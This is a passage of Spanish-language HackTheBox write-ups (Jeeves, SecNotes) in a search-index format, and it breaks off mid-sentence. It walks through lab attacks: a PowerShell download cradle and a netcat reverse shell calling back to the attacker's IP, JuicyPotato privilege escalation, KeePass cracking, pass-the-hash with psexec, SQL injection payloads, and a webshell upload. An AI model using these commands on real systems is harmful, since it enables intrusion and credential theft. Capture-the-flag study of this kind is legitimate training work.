Scan Timing: About 26.73% done; ETC: 20:10 (0:01:25 remaining)\nDiscovered open port 50000/tcp on 10.10.10.63\nCompleted Connect Scan at 20:10, 97.29s elapsed (65535 total ports)\nNmap scan report for 10.10.10.63\nHost is up, received user-set (0.069s latency).\nScanned at 2022-06-22 20:08:29 EDT for 97s\nNot shown: 65531 filtered tcp ports (no-response)\nSome closed ports may be reported as filtered due to --defeat-rst-ratelimit\nPORT      STATE SERVICE      REASON\n80/tcp    open  http         syn-ack\n135/tcp   open  msrpc        syn-ack\n445/tcp   open  microsoft-ds syn-ack\n50000/tcp open  ibm-db2      syn-ack\n\nRead data files from: /usr/bin/../share/nmap\nNmap done: 1 IP address (1 host up) scanned in 97.32 seconds\n</code></pre>","tags":["Jenkins Exploitation (Groovy Script Console)","Abusing SeImpersonatePrivilege","PassTheHash (Psexec)","Breaking KeePass","Alternate Data Streams (ADS)"]},{"location":"HackTheBox/Boxes/Windows/2%20Medio/Jeeves/#escaneo-especifico","title":"Escaneo espec\u00edfico","text":"<pre><code>\u2514\u2500$ nmap -sCV -p 80,135,445,50000 -n -Pn -oN nmap/targeted $TARGET\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-06-22 21:30 EDT\nNmap scan report for 10.10.10.63\nHost is up (0.069s latency).\n\nPORT      STATE SERVICE      VERSION\n80/tcp    open  http         Microsoft IIS httpd 10.0\n| http-methods:\n|_  Potentially risky methods: TRACE\n|_http-title: Ask Jeeves\n|_http-server-header: Microsoft-IIS/10.0\n135/tcp   open  msrpc        Microsoft Windows RPC\n445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)\n50000/tcp open  http         Jetty 9.4.z-SNAPSHOT\n|_http-title: Error 404 Not Found\n|_http-server-header: Jetty(9.4.z-SNAPSHOT)\nService Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb-security-mode:\n|   account_used: guest\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: disabled (dangerous, but default)\n| smb2-security-mode:\n|   3.1.1:\n|_    Message signing enabled but not required\n| smb2-time:\n|   date: 2022-06-23T06:30:29\n|_  start_date: 2022-06-22T23:59:38\n|_clock-skew: mean: 5h00m00s, deviation: 0s, median: 4h59m59s\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 47.15 seconds\n</code></pre>","tags":["Jenkins Exploitation (Groovy Script Console)","Abusing SeImpersonatePrivilege","PassTheHash (Psexec)","Breaking KeePass","Alternate Data Streams (ADS)"]},{"location":"HackTheBox/Boxes/Windows/2%20Medio/Jeeves/#enumeracion","title":"Enumeraci\u00f3n","text":"","tags":["Jenkins Exploitation (Groovy Script Console)","Abusing SeImpersonatePrivilege","PassTheHash (Psexec)","Breaking KeePass","Alternate Data Streams (ADS)"]},{"location":"HackTheBox/Boxes/Windows/2%20Medio/Jeeves/#servicios","title":"Servicios","text":"","tags":["Jenkins Exploitation (Groovy Script Console)","Abusing SeImpersonatePrivilege","PassTheHash (Psexec)","Breaking KeePass","Alternate Data Streams (ADS)"]},{"location":"HackTheBox/Boxes/Windows/2%20Medio/Jeeves/#http-80","title":"http - 80","text":"<p>Se presenta en el sitio web un formulario con un input el cual al realizar el submit se redirige a <code>error.html</code> que presenta un imagen relacionada al tipo de error que arroja un IIS. Dado que est\u00e1 hardcodeada la redireccion no se intent\u00f3 nada al respecto.</p> <p></p> <p>Por otro lado, tambi\u00e9n se busc\u00f3 fuzzear directorios mediante <code>ffuf</code>, sin tener \u00e9xito mostrando s\u00f3lo las rutas con las anteriormente se hab\u00eda interactuado.</p>","tags":["Jenkins Exploitation (Groovy Script Console)","Abusing SeImpersonatePrivilege","PassTheHash (Psexec)","Breaking KeePass","Alternate Data Streams (ADS)"]},{"location":"HackTheBox/Boxes/Windows/2%20Medio/Jeeves/#http-50000","title":"http - 50000","text":"","tags":["Jenkins Exploitation (Groovy Script Console)","Abusing SeImpersonatePrivilege","PassTheHash (Psexec)","Breaking KeePass","Alternate Data Streams (ADS)"]},{"location":"HackTheBox/Boxes/Windows/2%20Medio/Jeeves/#manual","title":"Manual","text":"<p>Se hace la omisi\u00f3n de los puertos en los cuales no se encontr\u00f3 informaci\u00f3n que pudiera resultar \u00fatil, sin embargo, en este puerto es mostrado un error gen\u00e9rico del servidor Jetty exponiendo en primera instancia la versi\u00f3n que se est\u00e1 ejecutando. Despu\u00e9s de buscar vulnerabilidades relacionadas e intentar explotarlas se decidi\u00f3 no darle seguimiento dado que en este punto se hab\u00eda visualizado una ruta expuesta en la ejecuci\u00f3n de <code>ffuf</code>.</p> <p></p>","tags":["Jenkins Exploitation (Groovy Script Console)","Abusing SeImpersonatePrivilege","PassTheHash (Psexec)","Breaking KeePass","Alternate Data Streams (ADS)"]},{"location":"HackTheBox/Boxes/Windows/2%20Medio/Jeeves/#ffuf","title":"ffuf","text":"<p>Despu\u00e9s de casi completar el diccionario que por lo regular se usa, se identific\u00f3 la ruta <code>askjeeves</code> mediante:</p> <pre><code>ffuf -c -ic -u http://10.10.10.63:50000/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e .txt,.xml,.html\n</code></pre> <p></p> <p>Por lo que al navegar a esta se identific\u00f3 la disponibilidad de un servidor Jenkins, abriendo paso a posibles rutas de explotaci\u00f3n haciendo uso de las caracter\u00edsticas ofrecidas por la plataforma.</p> <p></p>","tags":["Jenkins Exploitation (Groovy Script Console)","Abusing SeImpersonatePrivilege","PassTheHash (Psexec)","Breaking KeePass","Alternate Data Streams (ADS)"]},{"location":"HackTheBox/Boxes/Windows/2%20Medio/Jeeves/#explotacion","title":"Explotaci\u00f3n","text":"","tags":["Jenkins Exploitation (Groovy Script Console)","Abusing SeImpersonatePrivilege","PassTheHash (Psexec)","Breaking KeePass","Alternate Data Streams (ADS)"]},{"location":"HackTheBox/Boxes/Windows/2%20Medio/Jeeves/#rce-1","title":"RCE 1","text":"","tags":["Jenkins Exploitation (Groovy Script Console)","Abusing SeImpersonatePrivilege","PassTheHash (Psexec)","Breaking KeePass","Alternate Data Streams (ADS)"]},{"location":"HackTheBox/Boxes/Windows/2%20Medio/Jeeves/#pasos-previos-preparacion","title":"Pasos previos | Preparaci\u00f3n","text":"<p>Jenkins ofrece una consola de scripts siguiendo la sint\u00e1xis de Groovy, disponible en <code>Build Executor Status &gt; master &gt; Script Console</code>.</p> <p></p> <p>Al visualizar la sint\u00e1xis necesaria para ejecutar comandos de consola expuesta en la misma secci\u00f3n, se prepar\u00f3 la reverse shell de nishang ejecutando al final del archivo la funci\u00f3n empleada para entablar una reverse shell:</p> <pre><code>Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.16 -Port 443\n</code></pre>","tags":["Jenkins Exploitation (Groovy Script Console)","Abusing SeImpersonatePrivilege","PassTheHash (Psexec)","Breaking KeePass","Alternate Data Streams (ADS)"]},{"location":"HackTheBox/Boxes/Windows/2%20Medio/Jeeves/#ejecucion","title":"Ejecuci\u00f3n","text":"<p>Se envi\u00f3 la invocaci\u00f3n al recurso expuesto mediante la consola de scripts:</p> <pre><code>print \"powershell.exe IEX(New-Object Net.WebClient).downloadString('http://10.10.14.16/Invoke-PowerShellTcp.ps1')\".execute().text\n</code></pre> <p>Estableciendo as\u00ed la reverse shell.</p> <p></p>","tags":["Jenkins Exploitation (Groovy Script Console)","Abusing SeImpersonatePrivilege","PassTheHash (Psexec)","Breaking KeePass","Alternate Data Streams (ADS)"]},{"location":"HackTheBox/Boxes/Windows/2%20Medio/Jeeves/#rce-2","title":"RCE 2","text":"","tags":["Jenkins Exploitation (Groovy Script Console)","Abusing SeImpersonatePrivilege","PassTheHash (Psexec)","Breaking KeePass","Alternate Data Streams (ADS)"]},{"location":"HackTheBox/Boxes/Windows/2%20Medio/Jeeves/#pasos-previos-preparacion_1","title":"Pasos previos | Preparaci\u00f3n","text":"<p>Igualmente se pueden ejecutar comandos directamente en la m\u00e1quina mediante la creaci\u00f3n de un nuevo item <code>Create New Item &gt; Freestyle Project &gt; Build &gt; Execute Windows batch command</code>, guardando en el campo de texto el comando a ejecutar:</p> <pre><code>powershell.exe IEX(New-Object Net.WebClient).downloadString('http://10.10.14.16/Invoke-PowerShellTcp.ps1')\n</code></pre> <p></p>","tags":["Jenkins Exploitation (Groovy Script Console)","Abusing SeImpersonatePrivilege","PassTheHash (Psexec)","Breaking KeePass","Alternate Data Streams (ADS)"]},{"location":"HackTheBox/Boxes/Windows/2%20Medio/Jeeves/#ejecucion_1","title":"Ejecuci\u00f3n","text":"<p>Restando s\u00f3lo guardar el proceso en la plataforma y ejecutarlo (<code>Save &gt; Build Now</code>). Teniendo de esta forma otra manera de ejecutar comandos a trav\u00e9s de Jenkins.</p> <p></p>","tags":["Jenkins Exploitation (Groovy Script Console)","Abusing SeImpersonatePrivilege","PassTheHash (Psexec)","Breaking KeePass","Alternate Data Streams (ADS)"]},{"location":"HackTheBox/Boxes/Windows/2%20Medio/Jeeves/#post-explotacion","title":"Post Explotaci\u00f3n","text":"","tags":["Jenkins Exploitation (Groovy Script Console)","Abusing SeImpersonatePrivilege","PassTheHash (Psexec)","Breaking KeePass","Alternate Data Streams (ADS)"]},{"location":"HackTheBox/Boxes/Windows/2%20Medio/Jeeves/#enumeracion_1","title":"Enumeraci\u00f3n","text":"<p>Al ejecutar:</p> <pre><code>whoami /all\n</code></pre> <p>Para observar los privilegios con los que cuenta el usuario, se visualiz\u00f3 disponible el privilegio <code>SeImpersonatePrivilege</code> habilitado lo que denota la ruta de escalaci\u00f3n haciendo uso de JuicyPotato.</p> <p></p> <p>Adem\u00e1s, se identific\u00f3 una base de datos de KeePass <code>CEH.kdbx</code> en el directorio <code>Documents</code> del usuario, abriendo otra ruta de escalaci\u00f3n si se llegara a encontrar informaci\u00f3n relevante para el proceso.</p> <p></p>","tags":["Jenkins Exploitation (Groovy Script Console)","Abusing SeImpersonatePrivilege","PassTheHash (Psexec)","Breaking KeePass","Alternate Data Streams (ADS)"]},{"location":"HackTheBox/Boxes/Windows/2%20Medio/Jeeves/#escalacion-de-privilegios","title":"Escalaci\u00f3n de privilegios","text":"","tags":["Jenkins Exploitation (Groovy Script Console)","Abusing SeImpersonatePrivilege","PassTheHash (Psexec)","Breaking KeePass","Alternate Data Streams (ADS)"]},{"location":"HackTheBox/Boxes/Windows/2%20Medio/Jeeves/#kohsuke-nt-authoritysystem","title":"kohsuke \u2192 nt authority\\system","text":"","tags":["Jenkins Exploitation (Groovy Script Console)","Abusing SeImpersonatePrivilege","PassTheHash (Psexec)","Breaking KeePass","Alternate Data Streams (ADS)"]},{"location":"HackTheBox/Boxes/Windows/2%20Medio/Jeeves/#juicypotato","title":"JuicyPotato","text":"<p>Al cargar previamente el binario de netcat y ejecutar el binario de JuicyPotato se obtuvo una reverse shell como <code>nt authority\\system</code> mediante:</p> <pre><code>.\\jp.exe -t * -l 1337 -p cmd.exe -a \" /c C:\\users\\kohsuke\\downloads\\nc.exe -e cmd.exe 10.10.14.16 1234\"\n</code></pre> <p></p> <ol> <li>Ejecuci\u00f3n de JuicyPotato.</li> <li>Otenci\u00f3n de reverse shell.</li> </ol>","tags":["Jenkins Exploitation (Groovy Script Console)","Abusing SeImpersonatePrivilege","PassTheHash (Psexec)","Breaking KeePass","Alternate Data Streams (ADS)"]},{"location":"HackTheBox/Boxes/Windows/2%20Medio/Jeeves/#keepass","title":"KeePass","text":"<p>Se extrajo la base de datos de KeePass haciendo uso de la utiler\u00eda de impacket, mediante:</p> <pre><code>impacket-smbserver smbFolder $(pwd) -smb2support` y realizando el copiado con `cp .\\CEH.kdbx \\\\10.10.14.16\\smbFolder\n</code></pre> <p>Posteriormente, para crackear el archivo fue necesario primero extraer el hash del mismo, usando <code>keepass2john CEH.kdbx &gt; ceh.hash</code> para a continuaci\u00f3n iniciar el proceso de cracking haciendo uso de:</p> <pre><code>john ceh.hash --wordlist=/usr/share/wordlists/rockyou.txt\n</code></pre> <p>Obteniendo as\u00ed la contrase\u00f1a del archivo (<code>moonshine1</code>).</p> <p></p> <p>La base de datos expone m\u00faltiples entradas con contrase\u00f1as disponibles aunque una en particular se realz\u00f3 por sobre todas debido al formato de la entrada. Identificandola como un hash NTLM <code>aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00</code>.</p> <p></p> <p>Por lo que hizo uso de nuevo de impacket para conectar a la m\u00e1quina proveyendo el hash. Dada la estructura de lo hashes NTLM se podr\u00eda usar tanto como:</p> <pre><code>impacket-psexec 'administrator@10.10.10.63' -hashes 'aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00'\n</code></pre> <p>Como con:</p> <pre><code>impacket-psexec 'administrator@10.10.10.63' -hashes ':e0fb1fb85756c24235ff238cbe81fe00'\n</code></pre> <p>Debido a que la primera mitad corresponde al identificador de la m\u00e1quina y la segunda a la \"autorizaci\u00f3n\" del usuario.</p> <p></p>","tags":["Jenkins Exploitation (Groovy Script Console)","Abusing SeImpersonatePrivilege","PassTheHash (Psexec)","Breaking KeePass","Alternate Data Streams (ADS)"]},{"location":"HackTheBox/Boxes/Windows/2%20Medio/Jeeves/#obtencion-de-bandera","title":"Obtenci\u00f3n de bandera","text":"<p>Despu\u00e9s de buscar extraer el contenido de la bandera, se encontr\u00f3 el archivo <code>hm.txt</code> el cu\u00e1l indica que la bandera no se encuentra presente si no en otro sitio. Durante ese proceso se encontr\u00f3 informaci\u00f3n referente a los Alternate Data Streams que b\u00e1sicamente son una forma de ocultar informaci\u00f3n en un archivo y la caracter\u00edstica existe \u00fanicamente en sistemas de archivos de tipo NTFS.</p> <p></p> <p>Por lo que haciendo uso de los comandos sugeridos en el art\u00edculo se pudo visualizar que el stream oculto era <code>root.txt</code> con:</p> <pre><code>powershell.exe get-item -path .\\hm.txt -stream *\n</code></pre> <p>Para posteriormente extraer su contenido mediante:</p> <pre><code>powershell.exe get-content -path .\\hm.txt -stream root.txt\n</code></pre> <p></p>","tags":["Jenkins Exploitation (Groovy Script Console)","Abusing SeImpersonatePrivilege","PassTheHash (Psexec)","Breaking KeePass","Alternate Data Streams (ADS)"]},{"location":"HackTheBox/Boxes/Windows/2%20Medio/Jeeves/#referencias","title":"Referencias","text":"<ul> <li>CVE Details - Jetty.</li> <li>Github - Nishang.</li> <li>Github - JuicyPotato.</li> <li>Github - Impacket.</li> <li>Introduction to Alternate Data Streams.</li> </ul>","tags":["Jenkins Exploitation (Groovy Script Console)","Abusing SeImpersonatePrivilege","PassTheHash (Psexec)","Breaking KeePass","Alternate Data Streams (ADS)"]},{"location":"HackTheBox/Boxes/Windows/2%20Medio/SecNotes/","title":"SecNotes","text":"<p>Write-up de la m\u00e1quina SecNotes de HackTheBox.</p> <p></p>","tags":["User Enumeration (Wfuzz)","Reflected XSS","Stored XSS","SQL Injection","Cross-Site Request Forgery (CSRF) - Changing a user's password","IIS Exploitation (Uploading WebShell)","Abusing Windows Subsystem for Linux (WSL)","Information Leakage (Privilege Escalation)"]},{"location":"HackTheBox/Boxes/Windows/2%20Medio/SecNotes/#indice","title":"\u00cdndice","text":"<ul> <li>Introducci\u00f3n</li> <li>Estad\u00edsticas</li> <li>Reconocimiento</li> <li>Escaneo de host<ul> <li>Escaneo completo de puertos</li> <li>Escaneo espec\u00edfico</li> </ul> </li> <li>Enumeraci\u00f3n</li> <li>Servicios<ul> <li>http - 80</li> <li>Manual</li> <li>ffuf</li> <li>http - 8808</li> </ul> </li> <li>Explotaci\u00f3n</li> <li>XSS</li> <li>SQL Injection</li> <li>RCE</li> <li>Post Explotaci\u00f3n</li> <li>Enumeraci\u00f3n</li> <li>Escalaci\u00f3n de privilegios<ul> <li>tyler \u2192 nt authority\\system</li> </ul> </li> <li>Notas adicionales<ul> <li>Cross-Site Request Forgery (CSRF)</li> </ul> </li> <li>Referencias</li> </ul>","tags":["User Enumeration (Wfuzz)","Reflected XSS","Stored XSS","SQL Injection","Cross-Site Request Forgery (CSRF) - Changing a user's password","IIS Exploitation (Uploading WebShell)","Abusing Windows Subsystem for Linux (WSL)","Information Leakage (Privilege Escalation)"]},{"location":"HackTheBox/Boxes/Windows/2%20Medio/SecNotes/#introduccion","title":"Introducci\u00f3n","text":"","tags":["User Enumeration (Wfuzz)","Reflected XSS","Stored XSS","SQL Injection","Cross-Site Request Forgery (CSRF) - Changing a user's password","IIS Exploitation (Uploading WebShell)","Abusing Windows Subsystem for Linux (WSL)","Information Leakage (Privilege Escalation)"]},{"location":"HackTheBox/Boxes/Windows/2%20Medio/SecNotes/#estadisticas","title":"Estad\u00edsticas","text":"Caracter\u00edstica Descripci\u00f3n Nombre SecNotes OS Windows Dificultad oficial Medium Dificultad de comunidad Puntos 30 Creadores 0xdf","tags":["User Enumeration (Wfuzz)","Reflected XSS","Stored XSS","SQL Injection","Cross-Site Request Forgery (CSRF) - Changing a user's password","IIS Exploitation (Uploading WebShell)","Abusing Windows Subsystem for Linux (WSL)","Information Leakage (Privilege Escalation)"]},{"location":"HackTheBox/Boxes/Windows/2%20Medio/SecNotes/#reconocimiento","title":"Reconocimiento","text":"","tags":["User Enumeration (Wfuzz)","Reflected XSS","Stored XSS","SQL Injection","Cross-Site Request Forgery (CSRF) - Changing a user's password","IIS Exploitation (Uploading WebShell)","Abusing Windows Subsystem for Linux (WSL)","Information Leakage (Privilege Escalation)"]},{"location":"HackTheBox/Boxes/Windows/2%20Medio/SecNotes/#escaneo-de-host","title":"Escaneo de host","text":"","tags":["User Enumeration (Wfuzz)","Reflected XSS","Stored XSS","SQL Injection","Cross-Site Request Forgery (CSRF) - Changing a user's password","IIS Exploitation (Uploading WebShell)","Abusing Windows Subsystem for Linux (WSL)","Information Leakage (Privilege Escalation)"]},{"location":"HackTheBox/Boxes/Windows/2%20Medio/SecNotes/#escaneo-completo-de-puertos","title":"Escaneo completo de puertos","text":"<pre><code>\u2514\u2500$ nmap -T5 -vvv -open -p- -n -Pn -oG nmap/all_ports $TARGET\nHost discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-06-20 12:56 EDT\nInitiating Connect Scan at 12:56\nScanning 10.10.10.97 [65535 ports]\nDiscovered open port 80/tcp on 10.10.10.97\nDiscovered open port 445/tcp on 10.10.10.97\nConnect Scan Timing: About 27.21% done; ETC: 12:58 (0:01:23 remaining)\nDiscovered open port 8808/tcp on 10.10.10.97\nCompleted Connect Scan at 12:57, 71.58s elapsed (65535 total ports)\nNmap scan report for 10.10.10.97\nHost is up, received user-set (0.067s latency).\nScanned at 2022-06-20 12:56:42 EDT for 71s\nNot shown: 65532 filtered tcp ports (no-response)\nSome closed ports may be reported as filtered due to --defeat-rst-ratelimit\nPORT     STATE SERVICE       REASON\n80/tcp   open  http          syn-ack\n445/tcp  open  microsoft-ds  syn-ack\n8808/tcp open  ssports-bcast syn-ack\n\nRead data files from: /usr/bin/../share/nmap\nNmap done: 1 IP address (1 host up) scanned in 71.61 seconds\n</code></pre>","tags":["User Enumeration (Wfuzz)","Reflected XSS","Stored XSS","SQL Injection","Cross-Site Request Forgery (CSRF) - Changing a user's password","IIS Exploitation (Uploading WebShell)","Abusing Windows Subsystem for Linux (WSL)","Information Leakage (Privilege Escalation)"]},{"location":"HackTheBox/Boxes/Windows/2%20Medio/SecNotes/#escaneo-especifico","title":"Escaneo espec\u00edfico","text":"<pre><code>\u2514\u2500$ nmap -sCV -p 80,445,8808 -n -Pn -oN nmap/targeted $TARGET\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-06-20 13:01 EDT\nNmap scan report for 10.10.10.97\nHost is up (0.068s latency).\n\nPORT     STATE SERVICE      VERSION\n80/tcp   open  http         Microsoft IIS httpd 10.0\n| http-title: Secure Notes - Login\n|_Requested resource was login.php\n| http-methods:\n|_  Potentially risky methods: TRACE\n|_http-server-header: Microsoft-IIS/10.0\n445/tcp  open  microsoft-ds Windows 10 Enterprise 17134 microsoft-ds (workgroup: HTB)\n8808/tcp open  http         Microsoft IIS httpd 10.0\n| http-methods:\n|_  Potentially risky methods: TRACE\n|_http-title: IIS Windows\n|_http-server-header: Microsoft-IIS/10.0\nService Info: Host: SECNOTES; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_clock-skew: mean: 2h20m00s, deviation: 4h02m30s, median: 0s\n| smb-security-mode:\n|   account_used: guest\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: disabled (dangerous, but default)\n| smb2-security-mode:\n|   3.1.1:\n|_    Message signing enabled but not required\n| smb2-time:\n|   date: 2022-06-20T17:01:33\n|_  start_date: N/A\n| smb-os-discovery:\n|   OS: Windows 10 Enterprise 17134 (Windows 10 Enterprise 6.3)\n|   OS CPE: cpe:/o:microsoft:windows_10::-\n|   Computer name: SECNOTES\n|   NetBIOS computer name: SECNOTES\\x00\n|   Workgroup: HTB\\x00\n|_  System time: 2022-06-20T10:01:31-07:00\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 51.84 seconds\n</code></pre>","tags":["User Enumeration (Wfuzz)","Reflected XSS","Stored XSS","SQL Injection","Cross-Site Request Forgery (CSRF) - Changing a user's password","IIS Exploitation (Uploading WebShell)","Abusing Windows Subsystem for Linux (WSL)","Information Leakage (Privilege Escalation)"]},{"location":"HackTheBox/Boxes/Windows/2%20Medio/SecNotes/#enumeracion","title":"Enumeraci\u00f3n","text":"","tags":["User Enumeration (Wfuzz)","Reflected XSS","Stored XSS","SQL Injection","Cross-Site Request Forgery (CSRF) - Changing a user's password","IIS Exploitation (Uploading WebShell)","Abusing Windows Subsystem for Linux (WSL)","Information Leakage (Privilege Escalation)"]},{"location":"HackTheBox/Boxes/Windows/2%20Medio/SecNotes/#servicios","title":"Servicios","text":"","tags":["User Enumeration (Wfuzz)","Reflected XSS","Stored XSS","SQL Injection","Cross-Site Request Forgery (CSRF) - Changing a user's password","IIS Exploitation (Uploading WebShell)","Abusing Windows Subsystem for Linux (WSL)","Information Leakage (Privilege Escalation)"]},{"location":"HackTheBox/Boxes/Windows/2%20Medio/SecNotes/#http-80","title":"http - 80","text":"","tags":["User Enumeration (Wfuzz)","Reflected XSS","Stored XSS","SQL Injection","Cross-Site Request Forgery (CSRF) - Changing a user's password","IIS Exploitation (Uploading WebShell)","Abusing Windows Subsystem for Linux (WSL)","Information Leakage (Privilege Escalation)"]},{"location":"HackTheBox/Boxes/Windows/2%20Medio/SecNotes/#manual","title":"Manual","text":"<p>Se presenta un sistema de autenticaci\u00f3n permitiendo el registro y el acceso a una aplicaci\u00f3n para crear y guardar notas personales por usuario. Exponiendo diveras rutas, obtenidas al iteractuar manualmente con el sitio, para dar paso a posibles caminos de explotaci\u00f3n.</p> <p></p> <p>Por ejemplo, se visualiz\u00f3 que el sitio est\u00e1 haciendo uso de PHP lo que pudiera significar que para interactuar (acciones CRUD de notas) por atr\u00e1s se hace uso de alguna base de datos y esto se reducir\u00eda a una posible inyecci\u00f3n SQL.</p> <p>Otra ruta expuesta, la cu\u00e1l expone un posible usuario de sistema (<code>tyler</code>) y el dominio (<code>secnotes.htb</code>) es <code>/contact.php</code>. Bajo la suposici\u00f3n que <code>tyler</code> tambi\u00e9n es un usuario de la plataforma se podr\u00eda craftear un payload XSS que permitiera capturar su cookie de sesi\u00f3n.</p> <p></p>","tags":["User Enumeration (Wfuzz)","Reflected XSS","Stored XSS","SQL Injection","Cross-Site Request Forgery (CSRF) - Changing a user's password","IIS Exploitation (Uploading WebShell)","Abusing Windows Subsystem for Linux (WSL)","Information Leakage (Privilege Escalation)"]},{"location":"HackTheBox/Boxes/Windows/2%20Medio/SecNotes/#ffuf","title":"ffuf","text":"<p>Despu\u00e9s de enumerar autom\u00e1ticamente las rutas y subdominios, no se identific\u00f3 nada relevante para las futuras fases.</p> <p></p>","tags":["User Enumeration (Wfuzz)","Reflected XSS","Stored XSS","SQL Injection","Cross-Site Request Forgery (CSRF) - Changing a user's password","IIS Exploitation (Uploading WebShell)","Abusing Windows Subsystem for Linux (WSL)","Information Leakage (Privilege Escalation)"]},{"location":"HackTheBox/Boxes/Windows/2%20Medio/SecNotes/#http-8808","title":"http - 8808","text":"<p>Se presenta \u00fanicamente el inicio por default de un servidor IIS, sin la obtenci\u00f3n de directorios existentes mediante el fuzzeo.</p> <p></p>","tags":["User Enumeration (Wfuzz)","Reflected XSS","Stored XSS","SQL Injection","Cross-Site Request Forgery (CSRF) - Changing a user's password","IIS Exploitation (Uploading WebShell)","Abusing Windows Subsystem for Linux (WSL)","Information Leakage (Privilege Escalation)"]},{"location":"HackTheBox/Boxes/Windows/2%20Medio/SecNotes/#explotacion","title":"Explotaci\u00f3n","text":"","tags":["User Enumeration (Wfuzz)","Reflected XSS","Stored XSS","SQL Injection","Cross-Site Request Forgery (CSRF) - Changing a user's password","IIS Exploitation (Uploading WebShell)","Abusing Windows Subsystem for Linux (WSL)","Information Leakage (Privilege Escalation)"]},{"location":"HackTheBox/Boxes/Windows/2%20Medio/SecNotes/#xss","title":"XSS","text":"<p>Despu\u00e9s de identificar la vulnerabilidad creando una nota para probar el payload y siendo que se tiene la ruta de <code>contact.php</code> se podr\u00eda haber explotado si existiera interacci\u00f3n mediante lo enviado y lo recibido al usuario <code>tyler@secnotes.htb</code>. A pesar de funcionar, no fue el caso.</p> <p></p> <p>Prueba de ejecuci\u00f3n</p> <p></p>","tags":["User Enumeration (Wfuzz)","Reflected XSS","Stored XSS","SQL Injection","Cross-Site Request Forgery (CSRF) - Changing a user's password","IIS Exploitation (Uploading WebShell)","Abusing Windows Subsystem for Linux (WSL)","Information Leakage (Privilege Escalation)"]},{"location":"HackTheBox/Boxes/Windows/2%20Medio/SecNotes/#sql-injection","title":"SQL Injection","text":"<p>Despu\u00e9s de probar diferentes m\u00e9todos tanto de manera manual como haciendo uso de <code>sqlmap</code>, principalmente en la creaci\u00f3n de notas, no se identific\u00f3 en esta secci\u00f3n, por lo que despu\u00e9s de identificar que el usuario tambi\u00e9n es mostrado en la visualizaci\u00f3n de las notas, se prob\u00f3 inyectar en este campo el payload.</p> <p>Haciendo uso de las 3 referencias marcadas relacionadas con la inyecci\u00f3n SQL, se procedi\u00f3 a ejecutar parte de la metodolog\u00eda para encontrar un modo de obtener una shell. Por lo que como paso inicial se reconoci\u00f3 que se efectuaba la inyecci\u00f3n dado que al registrar un usuario <code>'</code> se obtenia un error a la hora de hacer el logueo.</p> <p></p> <p>Error al loguear con credenciales.</p> <p></p> <p>A lo que posteriormente se busc\u00f3 identificar el n\u00famero de columnas presentes en la tabla usada, registrado un usuario iteratibamente de 1 a N hasta que se desplegara un error (quinta iteraci\u00f3n) encontrando as\u00ed el n\u00famero 4 mediante <code>' ORDER BY 4-- -</code>.</p> <p></p> <p>D\u00e1ndole seguimiento al proceso se ejecut\u00f3 <code>' UNION SELECT 1,2,3,4-- -</code> para identificar aquellas columnas que fueran cadenas para poder desplegar informaci\u00f3n all\u00ed, identificando as\u00ed la 2,3 y 4.</p> <p></p> <p>De acuerdo a las referencias encontradas se asumi\u00f3 que el nombre de la tabla que conten\u00eda las credenciales del sitio era com\u00fan (<code>users</code>), por lo que no s\u00e9 necesit\u00f3 encontrar el nombre de las tablas y bases de datos, adem\u00e1s de que se present\u00f3 una limitaci\u00f3n referente a la longitud en el campo de usuario, por consiguiente las consultas a inyectar quedaban un tanto restringidas pero mediante <code>' UNION SELECT 1,username,3,4 FROM users-- -</code> y <code>' UNION SELECT 1,password,3,4 FROM users-- -</code> se pudieron identificar los usuarios y sus contrase\u00f1as, siendo relevante s\u00f3lo usuario <code>tyler</code>.</p> <p></p> <p>Hashes de usuarios</p> <p></p> <p>Dado que al buscar realizar el crackeo del hash obtenido tom\u00f3 tiempo significativo a la hora de su ejecuci\u00f3n, se decidi\u00f3 buscar y emplear otro payload que de alguna forma realizara un bypass al logueo de este usuario, empleando <code>' OR 1=1-- -</code> para forzar un resultado booleano dado que se obtienen las notas del usuario en turno, logrando as\u00ed el despliegue de las notas de todos los usuarios, exponiendo lo que por sintaxis se asume que son credenciales del servicio de <code>smb</code>.</p> <pre><code>\\\\secnotes.htb\\new-site\ntyler / 92g!mA8BGjOirkL%OG*&amp;\n</code></pre> <p></p> <p>Con las credenciales obtenidas se prob\u00f3 el acceso haciendo de uso de:</p> <pre><code>crackmapexec smb 10.10.10.97 -u tyler -p '92g!mA8BGjOirkL%OG*&amp;' --shares\n</code></pre> <p>Visualizando as\u00ed los folders compartidos y pudiendo tener acceso de lectura y escritura a <code>new-site</code>.</p> <p></p> <p>Al entrar al folder compartido con:</p> <pre><code>smbclient \\\\\\\\10.10.10.97\\\\new-site -U 'tyler'\n</code></pre> <p>Se visualizaron los archivos predeterminados en el servidor IIS por que se puede relacionar con el puerto <code>8808</code>.</p> <p></p>","tags":["User Enumeration (Wfuzz)","Reflected XSS","Stored XSS","SQL Injection","Cross-Site Request Forgery (CSRF) - Changing a user's password","IIS Exploitation (Uploading WebShell)","Abusing Windows Subsystem for Linux (WSL)","Information Leakage (Privilege Escalation)"]},{"location":"HackTheBox/Boxes/Windows/2%20Medio/SecNotes/#rce","title":"RCE","text":"<p>Al probar directamente la carga de un archivo que pudiera brindar ejecuci\u00f3n remota de instrucciones en el servicio de smb, se identific\u00f3 que en el escenario planteado no fueron funcionales las shells bajo las extensiones asp y aspx, dado que previamente se identific\u00f3 el uso de PHP, se prob\u00f3 una shell de este tipo.</p> <p></p> <p>Obteniendo as\u00ed ejecuci\u00f3n de comandos.</p> <p></p> <p>Para entablar una reverse shell, inicialmente se busc\u00f3 cargar el binario de netcat en la 